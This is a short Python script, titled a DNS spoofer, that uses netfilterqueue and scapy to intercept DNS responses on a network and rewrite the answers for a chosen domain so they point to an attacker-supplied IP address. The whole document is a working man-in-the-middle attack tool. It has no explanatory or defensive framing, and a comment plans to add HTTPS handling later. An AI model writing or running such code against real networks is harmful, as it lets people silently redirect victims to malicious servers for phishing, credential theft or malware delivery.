#DNS SPOOFER
import netfilterqueue
import scapy.all as scapy
import argparse

def args():
    parser = argparse.ArgumentParser()
    parser.add_argument('-t','--target', dest='target', help='Target Domain to Spoof')
    parser.add_argument('-ip', dest='ip', help='IP to Send DNSRR too')
    (val) =  parser.parse_args()
    if not val.ip or not val.target:
        parser.error('INVALID ARGS, USE --help')
    return val

def ppacc(pacc):
    scapypacc = scapy.IP(pacc.get_payload())
    if scapypacc.haslayer(scapy.DNSRR):
        qname = scapypacc[scapy.DNSQR].qname
        if val.target in qname.decode():
            print('SPOOFING TARGET!')
            ans = scapy.DNSRR(rrname=qname, rdata=val.ip)
            scapypacc[scapy.DNS].an = ans
            scapypacc[scapy.DNS].ancount = 1

            del scapypacc[scapy.IP].len
            del scapypacc[scapy.IP].chksum
            del scapypacc[scapy.UDP].chksum
            del scapypacc[scapy.UDP].len
            
            pacc.set_payload(bytes(scapypacc)) # add https later

    pacc.accept()
val = args()
que = netfilterqueue.NetfilterQueue()
que.bind(0, ppacc)
que.run()